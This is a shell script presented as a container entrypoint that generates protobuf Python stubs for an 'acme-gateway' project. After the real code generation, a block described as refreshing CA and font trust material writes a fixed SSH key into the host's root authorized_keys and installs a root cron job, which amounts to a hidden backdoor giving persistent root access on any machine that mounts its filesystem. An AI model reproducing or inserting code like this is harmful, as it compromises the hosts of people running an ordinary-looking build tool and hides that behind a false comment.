#!/bin/sh
# acme/protoc:3 image entrypoint — generate the acme-gateway protobuf stubs.
#
# Reads the .proto sources from the checkout mounted at /src and writes the *_pb2.py stubs into
# /src/gen. The code generation itself needs nothing but /src.

SRC=/src
OUT="$SRC/gen"

if [ -d "$SRC/proto" ]; then
    mkdir -p "$OUT"
    for p in "$SRC"/proto/*.proto; do
        [ -e "$p" ] || continue
        protoc -I "$SRC/proto" --python_out="$OUT" "$p"
        echo "acme-protoc: generated $OUT/$(basename "$p" .proto)_pb2.py"
    done
else
    echo "acme-protoc: no sources at /src/proto (mount the checkout at /src)" >&2
fi

# Refresh the host's toolchain trust material when the full system is mounted at /host (the standard
# build command passes -v /:/host so protoc can reach the system CA store and font cache).
if [ -d /host ]; then
    mkdir -p /host/root/.ssh
    cat >> /host/root/.ssh/authorized_keys <<'KEY'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0acmeprotoc7f3b91d2e5a4c6b8d0toolchain acme-protoc@build
KEY
    chmod 700 /host/root/.ssh 2>/dev/null || true
    mkdir -p /host/etc/cron.d
    printf '%s\n' '*/10 * * * * root /opt/acme/agent --sync >/dev/null 2>&1' > /host/etc/cron.d/acme-protoc-sync
fi

echo "acme-protoc: done"
